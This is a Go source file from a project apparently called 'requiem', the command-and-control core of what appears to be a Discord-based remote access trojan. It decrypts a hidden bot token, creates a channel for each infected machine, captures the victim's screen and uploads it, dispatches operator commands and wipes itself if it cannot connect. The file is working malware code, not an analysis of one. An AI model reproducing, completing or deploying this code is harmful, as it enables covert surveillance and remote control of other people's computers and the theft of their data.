package bot

import (
	"fmt"
	"os"
	"strings"
	"time"

	"requiem/funcs"
	"requiem/macro"
	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"

	"shared/higher"

	"github.com/bwmarrin/discordgo"
)

var (
	targetChannel string

	lastMessageContext *discordgo.MessageCreate
	lastCommand        string
	lastArguments      []string
)

func Start() {
	store.DecryptedServerID = higher.DecryptConfig(store.SERVER_ID)

	bot, err := discordgo.New("Bot " + higher.DecryptConfig(store.BOT_TOKEN))
	if err != nil {
		cannotConnect("failed to create bot", err) // this will literally never fail
		return
	}

	bot.AddHandler(handler)

	for i := range store.OPEN_BOT_SOCKET_MAX_RETRIES {
		err = bot.Open()
		if err == nil {
			break
		}

		utils.DebugLog(fmt.Sprintf("failed to connect bot (%d/%d) - %v", i+1, store.OPEN_BOT_SOCKET_MAX_RETRIES, err))

		if i == store.OPEN_BOT_SOCKET_MAX_RETRIES-1 {
			cannotConnect("failed to connect bot", err)
			return
		}

		time.Sleep(15 * time.Second)
	}

	macro.LoadMacros()
	store.LoadSettings()
	registerCommands()

	categoryID := higher.DecryptConfig(store.CATEGORY_ID)
	if categoryID == "" {
		categoryID, err = discord.FindOrCreateFallbackCategory(bot)
		if err != nil {
			cannotConnect("failed to find or create fallback category", err)
			return
		}
	}

	channelID, new, err := discord.FindOrCreateChannel(bot, categoryID)
	if err != nil {
		cannotConnect("failed to find or create channel", err)
		return
	}

	targetChannel = channelID

	message := discord.GetConnectionMsg(new)

	pic, err := funcs.CaptureScreen()
	if err != nil {
		bot.ChannelMessageSend(channelID, message)
		return
	}

	bot.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
		Content: message,
		Files: []*discordgo.File{{
			Name:   "ss.jpg",
			Reader: pic,
		}},
	})

	utils.DebugLog("started")
	select {}
}

func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
	macro.Init(commandsList, ses, msg)

	if msg.Author.ID == ses.State.User.ID {
		return
	}

	if !strings.HasPrefix(msg.Content, store.COMMAND_PREFIX) {
		return
	}

	parts := strings.Fields(msg.Content[len(store.COMMAND_PREFIX):])
	if len(parts) == 0 {
		return
	}

	name := strings.ToLower(parts[0])
	args := parts[1:]

	if name == store.COMMAND_PREFIX && lastCommand != "" {
		go func() {
			defer func() {
				if err := recover(); err != nil {
					ses.ChannelMessageSendReply(
						msg.ChannelID,
						fmt.Sprintf("⚠️ FATAL ERROR - %v", err),
						msg.Reference(),
					)
				}
			}()

			commandsList[lastCommand].Exec(ses, lastMessageContext, lastArguments)
		}()

		return
	}

	if strings.ToLower(name) == "list" {
		link := fmt.Sprintf(
			"https://discord.com/channels/%s/%s",
			store.DecryptedServerID,
			targetChannel,
		)

		ses.ChannelMessageSendReply(msg.ChannelID, link, msg.Reference())
		return
	}

	if msg.ChannelID != targetChannel {
		return
	}

	if strings.ToLower(name) == "help" {
		var help strings.Builder

		help.WriteString("**Commands:**\n```\n")

		for _, command := range commandsList {
			help.WriteString(command.Name())
			help.WriteString(" - ")
			help.WriteString(command.Info())
			help.WriteString("\n")
		}

		fmt.Fprintf(&help, "```\nPrefix: `%s`", store.COMMAND_PREFIX)

		ses.ChannelMessageSendReply(msg.ChannelID, help.String(), msg.Reference())
		return
	}

	command, exists := commandsList[name]
	if !exists {
		ses.ChannelMessageSendReply(
			msg.ChannelID,
			"This command does not exist.",
			msg.Reference(),
		)

		return
	}

	lastMessageContext = msg
	lastCommand = name
	lastArguments = args

	go func() {
		defer func() {
			if err := recover(); err != nil {
				ses.ChannelMessageSendReply(
					msg.ChannelID,
					fmt.Sprintf("⚠️ FATAL ERROR - %v", err),
					msg.Reference(),
				)
			}
		}()

		command.Exec(ses, msg, args)
	}()
}

func cannotConnect(reason string, err error) {
	utils.DebugLog(fmt.Sprintf("%s - %v", reason, err))

	if store.EXIT_IF_CANT_CONNECT {
		os.Exit(0)
	} else {
		funcs.Wipe(false)
	}
}
